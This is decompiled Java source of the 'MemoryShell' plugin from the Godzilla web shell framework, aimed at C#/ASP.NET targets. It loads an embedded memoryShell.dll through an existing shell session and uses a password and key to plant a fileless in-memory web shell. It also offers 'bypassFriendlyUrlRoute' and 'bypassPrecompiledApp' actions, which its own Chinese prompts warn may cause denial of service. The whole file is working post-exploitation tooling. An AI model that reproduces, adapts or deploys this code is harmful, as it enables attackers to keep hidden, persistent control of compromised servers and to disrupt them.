/*     */ package shells.plugins.cshap;
/*     */ import com.intellij.uiDesigner.core.GridConstraints;
/*     */ import com.intellij.uiDesigner.core.GridLayoutManager;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.Dimension;
/*     */ import java.awt.Insets;
/*     */ import java.awt.LayoutManager;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.ByteArrayOutputStream;
/*     */ import java.io.PrintStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComboBox;
/*     */ import javax.swing.JComponent;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JTextField;
/*     */ import util.UiFunction;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ @PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "MemoryShell", DisplayName = "内存Shell")
/*     */ public class MemoryShell implements Plugin {
/*  25 */   private static final String[] MemoryShellTYPES = new String[] { "CSHARP_AES_BASE64" };
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private static final String CLASS_NAME = "memoryShell.Run";
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel mainPanel;
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JTextField passwordTextField;
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public JTextField keyTextField;
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel corePanel;
/*     */ 
/*     */ 
/*     */   
/*     */   public JLabel passwordLabel;
/*     */ 
/*     */ 
/*     */   
/*     */   public JLabel memoryShellTypeLabel;
/*     */ 
/*     */ 
/*     */   
/*     */   public JComboBox memoryShellTypeComboBox;
/*     */ 
/*     */ 
/*     */   
/*     */   public JButton addMemoryShellButton;
/*     */ 
/*     */ 
/*     */   
/*     */   public JButton bypassFriendlyUrlRouteButton;
/*     */ 
/*     */ 
/*     */   
/*     */   public JButton bypassPrecompiledAppButton;
/*     */ 
/*     */ 
/*     */   
/*     */   public ShellEntity shellEntity;
/*     */ 
/*     */ 
/*     */   
/*     */   public Payload payload;
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean load;
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private boolean load() {
/*     */     try {
/*     */       if (!this.load) {
/*     */         this.load = this.payload.include("memoryShell.Run", functions.readInputStreamAutoClose(MemoryShell.class.getResourceAsStream(String.format("assets/memoryShell.dll", new Object[0]))));
/*     */       }
/*     */     } catch (Exception e) {
/*     */       e.printStackTrace();
/*     */       ByteArrayOutputStream stream = new ByteArrayOutputStream();
/*     */       PrintStream printStream = new PrintStream(stream);
/*     */       e.printStackTrace(printStream);
/*     */       printStream.flush();
/*     */       printStream.close();
/*     */       JOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), new String(stream.toByteArray()));
/*     */     } 
/*     */     return this.load;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private void addMemoryShellButtonClick(ActionEvent actionEvent) {
/*     */     if (load()) {
/*     */       String password = this.passwordTextField.getText().trim();
/*     */       String key = this.keyTextField.getText().trim();
/*     */       if (password.isEmpty() || key.isEmpty()) {
/*     */         GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "密码或密钥是空的");
/*     */         return;
/*     */       } 
/*     */       ReqParameter reqParameter = new ReqParameter();
/*     */       reqParameter.add("password", password);
/*     */       reqParameter.add("key", functions.md5(key).substring(0, 16));
/*     */       reqParameter.add("action", "addShell");
/*     */       String result = new String(this.payload.evalFunc("memoryShell.Run", "addShell", reqParameter));
/*     */       GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
/*     */     } else {
/*     */       GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "插件加载失败");
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public MemoryShell() {
/* 133 */     $$$setupUI$$$();
/*     */     Arrays.<String>stream(MemoryShellTYPES).forEach(type -> this.memoryShellTypeComboBox.addItem(type));
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   private void $$$setupUI$$$() {
/* 144 */     this.mainPanel = new JPanel();
/* 145 */     this.mainPanel.setLayout((LayoutManager)new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1, true, true));
/* 146 */     this.corePanel = new JPanel();
/* 147 */     this.corePanel.setLayout((LayoutManager)new GridLayoutManager(6, 2, new Insets(0, 0, 0, 0), -1, -1));
/* 148 */     this.mainPanel.add(this.corePanel, new GridConstraints(0, 0, 1, 1, 0, 0, 3, 3, null, null, null, 0, false));
/* 149 */     this.passwordLabel = new JLabel();
/* 150 */     this.passwordLabel.setText("密码:");
/* 151 */     this.corePanel.add(this.passwordLabel, new GridConstraints(0, 0, 1, 1, 8, 0, 0, 0, null, null, null, 0, false));
/* 152 */     this.passwordTextField = new JTextField();
/* 153 */     this.passwordTextField.setText("pass");
/* 154 */     this.corePanel.add(this.passwordTextField, new GridConstraints(0, 1, 1, 1, 8, 1, 4, 0, null, new Dimension(150, -1), null, 0, false));
/* 155 */     JLabel label1 = new JLabel();
/* 156 */     label1.setText("密钥:");
/* 157 */     this.corePanel.add(label1, new GridConstraints(1, 0, 1, 1, 8, 0, 0, 0, null, null, null, 0, false));
/* 158 */     this.keyTextField = new JTextField();
/* 159 */     this.keyTextField.setText("key");
/* 160 */     this.corePanel.add(this.keyTextField, new GridConstraints(1, 1, 1, 1, 0, 1, 4, 0, null, new Dimension(150, -1), null, 0, false));
/* 161 */     this.memoryShellTypeLabel = new JLabel();
/* 162 */     this.memoryShellTypeLabel.setText("Shell类型");
/* 163 */     this.corePanel.add(this.memoryShellTypeLabel, new GridConstraints(2, 0, 1, 1, 8, 0, 0, 0, null, null, null, 0, false));
/* 164 */     this.memoryShellTypeComboBox = new JComboBox();
/* 165 */     this.corePanel.add(this.memoryShellTypeComboBox, new GridConstraints(2, 1, 1, 1, 8, 1, 2, 0, null, null, null, 0, false));
/* 166 */     this.addMemoryShellButton = new JButton();
/* 167 */     this.addMemoryShellButton.setText("添加内存Shell");
/* 168 */     this.corePanel.add(this.addMemoryShellButton, new GridConstraints(5, 0, 1, 2, 0, 1, 3, 0, null, null, null, 0, false));
/* 169 */     this.bypassFriendlyUrlRouteButton = new JButton();
/* 170 */     this.bypassFriendlyUrlRouteButton.setText("bypassFriendlyUrlRoute");
/* 171 */     this.corePanel.add(this.bypassFriendlyUrlRouteButton, new GridConstraints(3, 0, 1, 2, 0, 1, 3, 0, null, null, null, 0, false));
/* 172 */     this.bypassPrecompiledAppButton = new JButton();
/* 173 */     this.bypassPrecompiledAppButton.setText("bypassPrecompiledApp");
/* 174 */     this.corePanel.add(this.bypassPrecompiledAppButton, new GridConstraints(4, 0, 1, 2, 0, 1, 3, 0, null, null, null, 0, false));
/*     */   } private void bypassFriendlyUrlRouteButtonClick(ActionEvent actionEvent) { if (load()) {
/*     */       int flag = GOptionPane.showConfirmDialog(UiFunction.getParentWindow(this.mainPanel), "如果你不知道这个功能是做什么的请不要点击! 这可能会引起拒绝服务!"); if (flag != 0)
/*     */         return;  ReqParameter reqParameter = new ReqParameter(); reqParameter.add("action", "bypassFriendlyUrlRoute"); String result = new String(this.payload.evalFunc("memoryShell.Run", "bypassFriendlyUrlRoute", reqParameter));
/*     */       GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
/*     */     } else {
/*     */       GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "插件加载失败");
/* 181 */     }  } public JComponent $$$getRootComponent$$$() { return this.mainPanel; }
/*     */ 
/*     */   
/*     */   private void bypassPrecompiledAppButtonClick(ActionEvent actionEvent) {
/*     */     if (load()) {
/*     */       int flag = GOptionPane.showConfirmDialog(UiFunction.getParentWindow(this.mainPanel), "如果你不知道这个功能是做什么的请不要点击! 这可能会引起拒绝服务!");
/*     */       if (flag != 0)
/*     */         return; 
/*     */       ReqParameter reqParameter = new ReqParameter();
/*     */       reqParameter.add("action", "bypassPrecompiledApp");
/*     */       String result = new String(this.payload.evalFunc("memoryShell.Run", "bypassPrecompiledApp", reqParameter));
/*     */       GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), result);
/*     */     } else {
/*     */       GOptionPane.showMessageDialog(UiFunction.getParentWindow(this.mainPanel), "插件加载失败");
/*     */     } 
/*     */   }
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/*     */     this.shellEntity = shellEntity;
/*     */     this.payload = shellEntity.getPayloadModule();
/*     */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */   
/*     */   public JPanel getView() {
/*     */     return this.mainPanel;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\cshap\MemoryShell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */